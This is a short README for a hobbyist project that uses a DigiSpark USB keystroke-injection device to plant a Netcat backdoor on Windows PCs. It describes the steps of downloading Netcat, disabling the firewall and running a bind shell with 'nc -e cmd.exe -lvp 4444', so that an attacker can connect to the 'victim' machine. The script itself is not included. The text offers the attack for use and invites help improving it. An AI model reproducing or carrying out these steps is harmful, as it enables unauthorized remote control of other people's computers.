# DigiSparkNetcatBackDoor
#A simple backdoor with Netcat fired by this DigiSpark key stroke injection.


#How to use?
-Coppy the code into Arduino IDE and then upload it to DigiSpark.


#What is this script doing?
-Downloads Netcat into the download folder of the logged user;
-Unzip the Netcat program to "C:\";
-Disable Firewall;
-And then run an instance of Netcat with parameters: "nc -e cmd.exe -lvp 4444";

Now you're free to connect to tve victim Windows machine via port 4444(or vhatever port u choose)


#The execution time for this attack is somewere in between 20 to 40 seconds(so pretty much a lot of time).
It needs some improvements so contact me if you wanna help!(I'm a beginner)

I'm waiting for your feedback!!!
